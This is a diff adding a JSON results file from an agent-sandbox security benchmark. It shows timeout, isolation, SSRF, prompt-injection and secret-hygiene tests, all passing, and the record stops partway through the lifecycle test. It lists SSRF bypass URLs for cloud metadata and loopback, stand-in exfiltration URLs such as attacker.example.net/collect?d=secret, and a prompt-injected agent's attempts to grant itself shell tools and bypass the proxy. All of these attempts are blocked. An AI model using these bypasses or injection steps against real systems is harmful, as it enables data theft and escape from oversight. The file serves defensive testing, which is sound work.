@@ -1,0 +1,1797 @@
+{
+  "benchmark": "vultr-agent-runtime-security",
+  "version": "1.0.0",
+  "host": "hackathon-vm",
+  "runtime_url": "http://127.0.0.1:8001",
+  "runtime_health": {
+    "ok": true,
+    "status": "ok",
+    "version": "1.0.0",
+    "oci_runtime": "runsc",
+    "egress_proxy": "up",
+    "queued": 0,
+    "running": 0,
+    "max_concurrency": 4
+  },
+  "oci_runtime": "runsc",
+  "started_at": 1795777527.4145737,
+  "finished_at": 1795777586.8493083,
+  "selection": "full",
+  "core_tests": [
+    "infinite_loop",
+    "sandbox_isolation",
+    "ssrf",
+    "prompt_injection",
+    "secret_hygiene",
+    "lifecycle"
+  ],
+  "core_passed": true,
+  "all_passed": true,
+  "summary": {
+    "total": 12,
+    "passed": 12,
+    "failed": 0
+  },
+  "tests": [
+    {
+      "id": "infinite_loop",
+      "name": "Infinite loop",
+      "priority": "P0",
+      "core": true,
+      "passed": true,
+      "duration_s": 6.1,
+      "observed": {
+        "status": "timeout",
+        "timeout_s": 5,
+        "observed_wall_s": 6.05,
+        "timed_out": true,
+        "timeout_events": [
+          "timeout_enforced_in_sandbox"
+        ],
+        "container_exists_after": false
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-d823c713142e120bec785567",
+        "profile": "python",
+        "oci_runtime": "runsc",
+        "container_id": "728a0cba4fade8686595c1f2dc0ed9f82688744c507f67fcb4d634dbc1078554",
+        "duration_ms": 5750,
+        "memory_peak_bytes": 37941248,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 0,
+        "code_exit_code": -9,
+        "oom_killed": false,
+        "timed_out": true,
+        "cancelled": false,
+        "security_events": [
+          "timeout_enforced_in_sandbox"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777533.167725
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "none",
+          "egress_policy": null,
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 5,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 510
+      }
+    },
+    {
+      "id": "sandbox_isolation",
+      "name": "Sandbox isolation",
+      "priority": "P0",
+      "core": true,
+      "passed": true,
+      "duration_s": 4.04,
+      "observed": {
+        "controlled_file": "/var/lib/vultr-runtime/bench-fixtures/outside_sandbox.txt",
+        "canary_leaked": false,
+        "sandbox_uid": 10001,
+        "files_scanned_in_sandbox": 10275,
+        "canary_hits": [],
+        "host_paths_missing": [
+          "/var/lib/vultr-runtime/bench-fixtures/outside_sandbox.txt",
+          "/proc/1/root/var/lib/vultr-runtime/bench-fixtures/outside_sandbox.txt",
+          "/host/var/lib/vultr-runtime/bench-fixtures/outside_sandbox.txt",
+          "/../../../var/lib/vultr-runtime/bench-fixtures/outside_sandbox.txt",
+          "/etc/vultr-runtime/backend.key",
+          "/etc/vultr-runtime/api_keys.json",
+          "/var/run/docker.sock",
+          "/run/docker.sock"
+        ],
+        "host_paths_denied": [
+          "/root/app/.env",
+          "/etc/shadow"
+        ],
+        "docker_socket_visible": false,
+        "status": "succeeded"
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-a29559d6958a6034d927f1ed",
+        "profile": "python",
+        "oci_runtime": "runsc",
+        "container_id": "df4f280c21dea0c2f4de2c02af6732a537c39688b17314798e2580a3f7b27822",
+        "duration_ms": 3969,
+        "memory_peak_bytes": 58560512,
+        "memory_limit_bytes": 268435456,
+        "exit_code": 0,
+        "code_exit_code": 0,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": null,
+          "policy_revoked": null,
+          "verified_at": 1795777537.4930584
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "none",
+          "egress_policy": null,
+          "memory_mb": 256,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 60,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 0
+        },
+        "blocked_operations": [],
+        "container_log_bytes": 6538
+      }
+    },
+    {
+      "id": "ssrf",
+      "name": "SSRF protection",
+      "priority": "P1",
+      "core": true,
+      "passed": true,
+      "duration_s": 3.03,
+      "observed": {
+        "forbidden_targets": 32,
+        "blocked_or_unreachable": 32,
+        "reached_forbidden": [],
+        "results": [
+          {
+            "url": "http://169.254.169.254/latest/meta-data/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:metadata-or-host-address"
+          },
+          {
+            "url": "http://2852039166/latest/meta-data/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:metadata-or-host-address"
+          },
+          {
+            "url": "http://[fd00:ec2::254]/latest/meta-data/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:metadata-or-host-address"
+          },
+          {
+            "url": "http://100.100.100.200/latest/meta-data/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:metadata-or-host-address"
+          },
+          {
+            "url": "http://metadata.google.internal/computeMetadata/v1/",
+            "outcome": "not reached",
+            "reason": 502
+          },
+          {
+            "url": "http://127.0.0.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://127.0.0.1:8001/health",
+            "outcome": "blocked",
+            "reason": "port-not-allowed"
+          },
+          {
+            "url": "http://localhost/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://2130706433/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://0x7f000001/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://0177.0.0.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://[::1]/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://[::ffff:127.0.0.1]/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:ipv4-mapped:loopback"
+          },
+          {
+            "url": "http://[::ffff:a9fe:a9fe]/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:ipv4-mapped:metadata-or-host-address"
+          },
+          {
+            "url": "http://[64:ff9b::a9fe:a9fe]/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:nat64:metadata-or-host-address"
+          },
+          {
+            "url": "http://0.0.0.0/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:unspecified"
+          },
+          {
+            "url": "http://10.0.0.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:private-network"
+          },
+          {
+            "url": "http://172.17.0.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:private-network"
+          },
+          {
+            "url": "http://192.168.1.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:private-network"
+          },
+          {
+            "url": "http://10.251.0.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:private-network"
+          },
+          {
+            "url": "http://100.64.0.1/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:non-global"
+          },
+          {
+            "url": "http://70.34.217.56/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:metadata-or-host-address"
+          },
+          {
+            "url": "https://70.34.217.56/",
+            "outcome": "not reached",
+            "reason": "ProxyError: HTTPSConnectionPool(host='70.34.217.56', port=443): Max retries exceeded with url: / (Caused by ProxyError('Unable to connect to proxy', OSError('Tunnel connect"
+          },
+          {
+            "url": "http://70.34.217.56:22/",
+            "outcome": "blocked",
+            "reason": "port-not-allowed"
+          },
+          {
+            "url": "http://localtest.me/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://127.0.0.1.nip.io/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:loopback"
+          },
+          {
+            "url": "http://169.254.169.254.nip.io/latest/meta-data/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:metadata-or-host-address"
+          },
+          {
+            "url": "http://10.0.0.1.nip.io/",
+            "outcome": "blocked",
+            "reason": "forbidden-destination:private-network"
+          },
+          {
+            "url": "https://example.com:22/",
+            "outcome": "not reached",
+            "reason": "ProxyError: HTTPSConnectionPool(host='example.com', port=22): Max retries exceeded with url: / (Caused by ProxyError('Unable to connect to proxy', OSError('Tunnel connectio"
+          },
+          {
+            "url": "https://postman-echo.com/redirect-to?url=http://169.254.169.254/latest/meta-data/",
+            "outcome": "redirect followed, target blocked",
+            "redirect_chain": [
+              302
+            ],
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "kind": "redirect"
+          },
+          {
+            "url": "https://postman-echo.com/redirect-to?url=http://127.0.0.1/",
+            "outcome": "redirect followed, target blocked",
+            "redirect_chain": [
+              302
+            ],
+            "reason": "forbidden-destination:loopback",
+            "kind": "redirect"
+          },
+          {
+            "url": "https://postman-echo.com/redirect-to?url=http://10.0.0.1/",
+            "outcome": "redirect followed, target blocked",
+            "redirect_chain": [
+              302
+            ],
+            "reason": "forbidden-destination:private-network",
+            "kind": "redirect"
+          }
+        ],
+        "proxy_connections_to_non_public_ips": [],
+        "proxy_allowed_hosts": [
+          "example.com",
+          "postman-echo.com"
+        ],
+        "control_public_request": 200,
+        "redirects_verified_blocked": 3,
+        "direct_socket_bypass": [
+          {
+            "target": "1.1.1.1:443",
+            "connected": false,
+            "error": "OSError"
+          },
+          {
+            "target": "8.8.8.8:53",
+            "connected": false,
+            "error": "OSError"
+          },
+          {
+            "target": "70.34.217.56:22",
+            "connected": false,
+            "error": "OSError"
+          },
+          {
+            "target": "169.254.169.254:80",
+            "connected": false,
+            "error": "OSError"
+          },
+          {
+            "target": "10.250.0.1:22",
+            "connected": false,
+            "error": "OSError"
+          }
+        ],
+        "local_dns_in_sandbox": "failed: gaierror",
+        "proxy_blocked_count": 31
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-160e03bc7e05942aea82a393",
+        "profile": "python-net",
+        "oci_runtime": "runsc",
+        "container_id": "3fdf6886a481b6a6e6ce39aaed3eee932b8d0936feef06264d0fddf078d36684",
+        "duration_ms": 2966,
+        "memory_peak_bytes": 50515968,
+        "memory_limit_bytes": 536870912,
+        "exit_code": 0,
+        "code_exit_code": 0,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [
+          "egress_blocked"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": true,
+          "policy_revoked": true,
+          "verified_at": 1795777540.5301397
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "internal per-job network; egress only via SSRF-filtering proxy",
+          "egress_policy": {
+            "allowed_domains": [
+              "*"
+            ],
+            "allow_trusted_targets": false
+          },
+          "memory_mb": 512,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 120,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 4,
+          "blocked": 31,
+          "destinations": [
+            {
+              "host": "postman-echo.com",
+              "port": 443,
+              "connected_ip": "162.159.142.41",
+              "trusted_target": false
+            },
+            {
+              "host": "postman-echo.com",
+              "port": 443,
+              "connected_ip": "162.159.142.41",
+              "trusted_target": false
+            },
+            {
+              "host": "postman-echo.com",
+              "port": 443,
+              "connected_ip": "162.159.142.41",
+              "trusted_target": false
+            },
+            {
+              "host": "example.com",
+              "port": 443,
+              "connected_ip": "104.20.23.154",
+              "trusted_target": false
+            }
+          ]
+        },
+        "blocked_operations": [
+          {
+            "source": "egress-proxy",
+            "operation": "GET 169.254.169.254:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "169.254.169.254"
+            ],
+            "ts": 1795777539.0347443
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 2852039166:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "169.254.169.254"
+            ],
+            "ts": 1795777539.038494
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET fd00:ec2::254:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "fd00:ec2::254"
+            ],
+            "ts": 1795777539.0421262
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 100.100.100.200:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "100.100.100.200"
+            ],
+            "ts": 1795777539.0450287
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 127.0.0.1:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.063557
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 127.0.0.1:8001",
+            "reason": "port-not-allowed",
+            "resolved": null,
+            "ts": 1795777539.0666206
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET localhost:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "::1",
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.069848
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 2130706433:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.0730875
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 0x7f000001:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.0759637
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 0177.0.0.1:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.0790207
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET ::1:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "::1"
+            ],
+            "ts": 1795777539.0821538
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET ::ffff:127.0.0.1:80",
+            "reason": "forbidden-destination:ipv4-mapped:loopback",
+            "resolved": [
+              "::ffff:127.0.0.1"
+            ],
+            "ts": 1795777539.0854986
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET ::ffff:a9fe:a9fe:80",
+            "reason": "forbidden-destination:ipv4-mapped:metadata-or-host-address",
+            "resolved": [
+              "::ffff:169.254.169.254"
+            ],
+            "ts": 1795777539.0888257
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 64:ff9b::a9fe:a9fe:80",
+            "reason": "forbidden-destination:nat64:metadata-or-host-address",
+            "resolved": [
+              "64:ff9b::a9fe:a9fe"
+            ],
+            "ts": 1795777539.0920634
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 0.0.0.0:80",
+            "reason": "forbidden-destination:unspecified",
+            "resolved": [
+              "0.0.0.0"
+            ],
+            "ts": 1795777539.0954227
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 10.0.0.1:80",
+            "reason": "forbidden-destination:private-network",
+            "resolved": [
+              "10.0.0.1"
+            ],
+            "ts": 1795777539.0990367
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 172.17.0.1:80",
+            "reason": "forbidden-destination:private-network",
+            "resolved": [
+              "172.17.0.1"
+            ],
+            "ts": 1795777539.1019049
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 192.168.1.1:80",
+            "reason": "forbidden-destination:private-network",
+            "resolved": [
+              "192.168.1.1"
+            ],
+            "ts": 1795777539.105027
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 10.251.0.1:80",
+            "reason": "forbidden-destination:private-network",
+            "resolved": [
+              "10.251.0.1"
+            ],
+            "ts": 1795777539.1081407
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 100.64.0.1:80",
+            "reason": "forbidden-destination:non-global",
+            "resolved": [
+              "100.64.0.1"
+            ],
+            "ts": 1795777539.1110709
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 70.34.217.56:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "70.34.217.56"
+            ],
+            "ts": 1795777539.1140764
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "CONNECT 70.34.217.56:443",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "70.34.217.56"
+            ],
+            "ts": 1795777539.1170337
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 70.34.217.56:22",
+            "reason": "port-not-allowed",
+            "resolved": null,
+            "ts": 1795777539.1193829
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET localtest.me:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "::1",
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.147643
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 127.0.0.1.nip.io:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.1755242
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 169.254.169.254.nip.io:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "169.254.169.254"
+            ],
+            "ts": 1795777539.2006474
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 10.0.0.1.nip.io:80",
+            "reason": "forbidden-destination:private-network",
+            "resolved": [
+              "10.0.0.1"
+            ],
+            "ts": 1795777539.2251272
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "CONNECT example.com:22",
+            "reason": "port-not-allowed",
+            "resolved": null,
+            "ts": 1795777539.229532
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 169.254.169.254:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "169.254.169.254"
+            ],
+            "ts": 1795777539.4601495
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 127.0.0.1:80",
+            "reason": "forbidden-destination:loopback",
+            "resolved": [
+              "127.0.0.1"
+            ],
+            "ts": 1795777539.7150486
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 10.0.0.1:80",
+            "reason": "forbidden-destination:private-network",
+            "resolved": [
+              "10.0.0.1"
+            ],
+            "ts": 1795777539.9401124
+          }
+        ],
+        "container_log_bytes": 13583
+      }
+    },
+    {
+      "id": "prompt_injection",
+      "name": "Prompt injection",
+      "priority": "P1",
+      "core": true,
+      "passed": true,
+      "duration_s": 8.6,
+      "observed": {
+        "hostile_page": {
+          "status": "succeeded",
+          "extracted_price": "499 kr",
+          "proxy_blocked_subrequests": [
+            {
+              "op": "GET 10.0.0.1:80",
+              "reason": "domain-not-in-allowlist"
+            },
+            {
+              "op": "GET 127.0.0.1:8001",
+              "reason": "port-not-allowed"
+            },
+            {
+              "op": "CONNECT exfil.attacker.example.net:443",
+              "reason": "domain-not-in-allowlist"
+            },
+            {
+              "op": "GET 169.254.169.254:80",
+              "reason": "domain-not-in-allowlist"
+            }
+          ],
+          "browser_failed_requests": 3,
+          "allowed_connections_to_forbidden": []
+        },
+        "naive_agent_attempts": [
+          {
+            "attempt": "navigate to cloud metadata",
+            "http_status": 403,
+            "error": "navigation_forbidden_destination",
+            "detail": "navigation to non-public address 169.254.169.254 is forbidden",
+            "blocked": true
+          },
+          {
+            "attempt": "navigate to attacker exfil URL",
+            "http_status": 403,
+            "error": "navigation_outside_allowlist",
+            "detail": "'attacker.example.net' is not in network.allowed_domains",
+            "blocked": true
+          },
+          {
+            "attempt": "fill password field (tool not permitted)",
+            "http_status": 403,
+            "error": "tool_not_permitted",
+            "detail": "browser action 'fill' is not permitted for this job",
+            "blocked": true
+          },
+          {
+            "attempt": "run arbitrary JavaScript (tool does not exist)",
+            "http_status": 403,
+            "error": "unknown_tool",
+            "detail": "browser action 'evaluate' does not exist",
+            "blocked": true
+          },
+          {
+            "attempt": "grant itself extra tools",
+            "http_status": 403,
+            "error": "unknown_tool",
+            "detail": "unknown browser tools requested: ['download', 'shell']",
+            "blocked": true
+          },
+          {
+            "attempt": "override runtime security policy",
+            "http_status": 422,
+            "error": null,
+            "detail": [
+              {
+                "type": "extra_forbidden",
+                "loc": [
+                  "body",
+                  "network",
+                  "bypass_proxy"
+                ],
+                "msg": "Extra inputs are not permitted",
+                "input": true
+              }
+            ],
+            "blocked": true
+          },
+          {
+            "attempt": "request privileged container",
+            "http_status": 422,
+            "error": null,
+            "detail": [
+              {
+                "type": "extra_forbidden",
+                "loc": [
+                  "body",
+                  "privileged"
+                ],
+                "msg": "Extra inputs are not permitted",
+                "input": true
+              }
+            ],
+            "blocked": true
+          },
+          {
+            "attempt": "generated code follows injection (egress)",
+            "blocked": true,
+            "proxy_blocked": 4,
+            "proxy_allowed": 0,
+            "observed": [
+              {
+                "url": "http://169.254.169.254/latest/meta-data/",
+                "status": 403,
+                "blocked_by": "domain-not-in-allowlist"
+              },
+              {
+                "url": "https://attacker.example.net/collect?d=secret",
+                "exception": "ProxyError"
+              },
+              {
+                "url": "http://127.0.0.1:8001/v1/jobs",
+                "status": 403,
+                "blocked_by": "port-not-allowed"
+              },
+              {
+                "url": "https://exfil.attacker.example.net/x",
+                "exception": "ProxyError"
+              }
+            ]
+          }
+        ]
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-70e9b1422a16424f22748e9d",
+        "profile": "browser",
+        "oci_runtime": "runsc",
+        "container_id": "4f937e4c23d96e52548bb6abaa54a44f07853e210c051af9ce7429abccbc23f5",
+        "duration_ms": 6512,
+        "memory_peak_bytes": 234389504,
+        "memory_limit_bytes": 1610612736,
+        "exit_code": 0,
+        "code_exit_code": null,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [
+          "egress_blocked"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": true,
+          "policy_revoked": true,
+          "verified_at": 1795777547.1105409
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "internal per-job network; egress only via SSRF-filtering proxy",
+          "egress_policy": {
+            "allowed_domains": [
+              "example.com"
+            ],
+            "allow_trusted_targets": false
+          },
+          "memory_mb": 1536,
+          "swap": "disabled",
+          "cpus": 2.0,
+          "pids_limit": 256,
+          "host_pids_backstop": 1024,
+          "tmpfs": {
+            "/work": "128m noexec,nosuid,nodev",
+            "/tmp": "256m noexec,nosuid,nodev",
+            "/dev/shm": "512m"
+          },
+          "timeout_s": 60,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 4
+        },
+        "blocked_operations": [
+          {
+            "source": "egress-proxy",
+            "operation": "GET 10.0.0.1:80",
+            "reason": "domain-not-in-allowlist",
+            "resolved": null,
+            "ts": 1795777543.2738223
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 127.0.0.1:8001",
+            "reason": "port-not-allowed",
+            "resolved": null,
+            "ts": 1795777543.2750418
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "CONNECT exfil.attacker.example.net:443",
+            "reason": "domain-not-in-allowlist",
+            "resolved": null,
+            "ts": 1795777543.2762058
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 169.254.169.254:80",
+            "reason": "domain-not-in-allowlist",
+            "resolved": null,
+            "ts": 1795777543.2771142
+          },
+          {
+            "source": "browser",
+            "operation": "http://10.0.0.1/steal.css",
+            "reason": "domain-not-in-allowlist"
+          },
+          {
+            "source": "browser",
+            "operation": "http://169.254.169.254/latest/meta-data/",
+            "reason": "domain-not-in-allowlist"
+          },
+          {
+            "source": "browser",
+            "operation": "http://127.0.0.1:8001/v1/jobs",
+            "reason": "port-not-allowed"
+          }
+        ],
+        "container_log_bytes": 26353
+      }
+    },
+    {
+      "id": "secret_hygiene",
+      "name": "Secret hygiene",
+      "priority": "P1",
+      "core": true,
+      "passed": true,
+      "duration_s": 2.02,
+      "observed": {
+        "secrets_checked": [
+          "synthetic host secret file",
+          "synthetic backend credential (controller env)",
+          "backend API key",
+          "benchmark API keys",
+          "egress proxy HMAC key"
+        ],
+        "leaked": [],
+        "sandbox_env_keys": [
+          "HOME",
+          "HTTPS_PROXY",
+          "HTTP_PROXY",
+          "LANG",
+          "NO_PROXY",
+          "PATH",
+          "PLAYWRIGHT_BROWSERS_PATH",
+          "PYTHONDONTWRITEBYTECODE",
+          "PYTHONUNBUFFERED",
+          "TMPDIR",
+          "VRT_PROXY_PASS",
+          "VRT_PROXY_SERVER",
+          "VRT_PROXY_USER",
+          "http_proxy",
+          "https_proxy",
+          "no_proxy"
+        ],
+        "note": "VRT_PROXY_* / HTTP(S)_PROXY carry a job-scoped proxy token that is revoked when the job ends."
+      },
+      "error": null,
+      "telemetry": {
+        "job_id": "job-f96adbd36836c04cc71f6003",
+        "profile": "python-net",
+        "oci_runtime": "runsc",
+        "container_id": "fb88e0fa6e8a20399c6450dd57107491eb995fec5aded6b16987c3415959dd83",
+        "duration_ms": 2004,
+        "memory_peak_bytes": 50106368,
+        "memory_limit_bytes": 536870912,
+        "exit_code": 0,
+        "code_exit_code": 0,
+        "oom_killed": false,
+        "timed_out": false,
+        "cancelled": false,
+        "security_events": [
+          "egress_blocked"
+        ],
+        "cleanup": {
+          "container_removed": true,
+          "network_removed": true,
+          "policy_revoked": true,
+          "verified_at": 1795777551.2024279
+        },
+        "policies": {
+          "oci_runtime": "runsc",
+          "user": "10001:10001 (non-root)",
+          "read_only_rootfs": true,
+          "cap_drop": [
+            "ALL"
+          ],
+          "no_new_privileges": true,
+          "network": "internal per-job network; egress only via SSRF-filtering proxy",
+          "egress_policy": {
+            "allowed_domains": [
+              "*"
+            ],
+            "allow_trusted_targets": false
+          },
+          "memory_mb": 512,
+          "swap": "disabled",
+          "cpus": 1.0,
+          "pids_limit": 64,
+          "host_pids_backstop": 512,
+          "tmpfs": {
+            "/work": "64m noexec,nosuid,nodev",
+            "/tmp": "64m noexec,nosuid,nodev",
+            "/dev/shm": "64m"
+          },
+          "timeout_s": 30,
+          "max_output_kb": 1024,
+          "log_cap": "32m",
+          "mounts": "none (no host paths, no Docker socket)",
+          "env": "fresh, no host or backend credentials"
+        },
+        "egress": {
+          "allowed": 0,
+          "blocked": 2
+        },
+        "blocked_operations": [
+          {
+            "source": "egress-proxy",
+            "operation": "GET 169.254.169.254:80",
+            "reason": "forbidden-destination:metadata-or-host-address",
+            "resolved": [
+              "169.254.169.254"
+            ],
+            "ts": 1795777550.715391
+          },
+          {
+            "source": "egress-proxy",
+            "operation": "GET 127.0.0.1:8001",
+            "reason": "port-not-allowed",
+            "resolved": null,
+            "ts": 1795777550.7197952
+          }
+        ],
+        "container_log_bytes": 15839
+      }
+    },
+    {
+      "id": "lifecycle",
+      "name": "Lifecycle",
+      "priority": "P0",
+      "core": true,
+      "passed": true,
+      "duration_s": 10.98,
+      "observed": {
+        "cases": [
+          {
+            "case": "success",
+            "status": "succeeded",
+            "container_id": "aaf4ab41bf04",
+            "container_exists_after": false,
+            "network_exists_after": null,
+            "controller_cleanup": {
+              "container_removed": true,
+              "network_removed": null,
+              "policy_revoked": null,
+              "verified_at": 1795777551.8940716
+            },
+            "passed": true
+          },
+          {
+            "case": "failure",
+            "status": "failed",
+            "container_id": "1d958b004e35",
+            "container_exists_after": false,
+            "network_exists_after": null,
+            "controller_cleanup": {
+              "container_removed": true,
+              "network_removed": null,
+              "policy_revoked": null,
+              "verified_at": 1795777552.952583
+            },
+            "passed": true
+          },
+          {
+            "case": "timeout",
+            "status": "timeout",
+            "container_id": "a6d2a79b35b5",
+            "container_exists_after": false,
+            "network_exists_after": null,
+            "controller_cleanup": {
+              "container_removed": true,
+              "network_removed": null,
+              "policy_revoked": null,
+              "verified_at": 1795777557.078389
+            },
+            "passed": true
+          },
+          {
+            "case": "networked",
+            "status": "succeeded",
+            "container_id": "24a39275cdbf",
+            "container_exists_after": false,
+            "network_exists_after": false,
+            "controller_cleanup": {
+              "container_removed": true,
+              "network_removed": true,
+              "policy_revoked": true,
+              "verified_at": 1795777558.3632305
+            },
+            "passed": true
+          },
+          {
+            "case": "browser",
+            "status": "succeeded",
+            "container_id": "2cd896a0b633",
+            "container_exists_after": false,
+            "network_exists_after": false,
+            "controller_cleanup": {
+              "container_removed": true,
+              "network_removed": true,
+              "policy_revoked": true,
